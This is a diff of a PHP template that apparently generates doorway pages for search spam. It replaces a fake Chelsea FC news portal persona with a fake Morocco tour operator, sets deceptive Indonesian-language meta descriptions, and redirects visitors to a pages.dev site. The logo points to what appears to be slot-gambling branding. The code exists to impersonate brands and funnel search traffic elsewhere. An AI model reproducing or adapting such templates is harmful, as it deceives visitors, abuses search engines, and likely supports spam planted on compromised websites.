@@ -62,14 +62,14 @@
         $current_url = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
 
         // SEO DATA (AUTO GENERATE)
-        $title = "$BRAND : Portal Berita Chelsea FC untuk Update News Transfer dan Pertandingan";
+        $title = "$BRAND : Vacation Morocco Tours untuk Menjelajahi Maroko dan Gurun Sahara";
 
-        $description = "$BRAND merupakan portal berita online yang didedikasikan untuk para penggemar Chelsea Football Club di seluruh dunia. Melalui chelsea247.com, pengunjung dapat membaca berbagai informasi mengenai klub, pemain, transfer, cedera, pertandingan, rumor, hingga ulasan dan analisis seputar Chelsea FC. Situs ini menyebut dirinya diluncurkan pada tahun 2017 dan menyediakan berbagai kategori berita yang berhubungan dengan aktivitas klub.";
+        $description = "$BRAND hadir sebagai penyedia perjalanan yang berfokus pada pengalaman menjelajahi Maroko. Dari informasi yang ditampilkan pada situs resminya, layanan mereka mencakup berbagai perjalanan dari Marrakech, Fes, Casablanca, Agadir, dan Ouarzazate dengan pilihan durasi mulai dari perjalanan singkat hingga itinerary panjang.";
         
-        $artikel = "merupakan portal berita online yang didedikasikan untuk para penggemar Chelsea Football Club di seluruh dunia. Melalui chelsea247.com, pengunjung dapat membaca berbagai informasi mengenai klub, pemain, transfer, cedera, pertandingan, rumor, hingga ulasan dan analisis seputar Chelsea FC. Situs ini menyebut dirinya diluncurkan pada tahun 2017 dan menyediakan berbagai kategori berita yang berhubungan dengan aktivitas klub.";
+        $artikel = "hadir sebagai penyedia perjalanan yang berfokus pada pengalaman menjelajahi Maroko. Dari informasi yang ditampilkan pada situs resminya, layanan mereka mencakup berbagai perjalanan dari Marrakech, Fes, Casablanca, Agadir, dan Ouarzazate dengan pilihan durasi mulai dari perjalanan singkat hingga itinerary panjang.";
 
         // Bisa diganti random image atau CDN sendiri
-        $image = "https://i.pinimg.com/1200x/c2/db/1e/c2db1e8e2e3a0e23fb0263f971bee009.jpg";  
+        $image = "https://i.pinimg.com/1200x/b7/39/f6/b739f6314d0f4b21bc6c59b968584e47.jpg";  
 
         // Canonical URL
         $canonical = $current_url;
@@ -79,7 +79,7 @@
     }
 
     // Redirect target
-    $ampmek = "https://chelsea247.pages.dev/?id=$BRAND";
+    $ampmek = "https://vacationmoroccotours.pages.dev/?id=$BRAND";
     $logo = "https://www.residentviews.com/assets/logo/aztec88-x-mediaslot78-dunia-game-digital-yang-setiap-detiknya-punya-kejutan.png";
     $favicon = "https://www.gstatic.com/search-console/scfe/favicon.png";
     ?>
